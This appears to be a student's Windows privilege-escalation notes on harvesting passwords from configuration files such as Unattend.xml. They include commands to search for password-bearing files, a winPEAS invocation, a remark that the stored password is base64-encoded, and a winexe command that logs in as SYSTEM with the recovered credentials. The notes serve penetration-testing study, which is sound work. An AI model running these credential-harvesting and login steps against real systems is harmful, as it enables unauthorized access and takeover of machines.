**Configuration Files**
- Unattend.xml is an example of this
	- allows for automated setup of Windows systems


1. Searching for configuration files
```
# Search for files in with "pass" in the name or ending in ".config"
dir /s *pass* == *.config*

# Searching for fies that containt he word "password" and also end in .xml, .ini, or .txt
findstr /si password *.xml *.ini *.txt
```
- don't run in system root unless necessary


2. Winpeas with cmd searchfast and filesinfo checks
```
.\winPEASany.exe quiet cmd searchfast filesinfo > winpeas-cmd-searchfast-filesinfo.txt
```
![](assets/Pasted%20image%2020260607142123.png)

3. output contents of Unattend.xml
![](assets/Pasted%20image%2020260607142150.png)
- password is base64 encoded by default

4. use winexe to log in
```
winexe -U 'admin%password123' --system \\<IP> cmd.exe
```
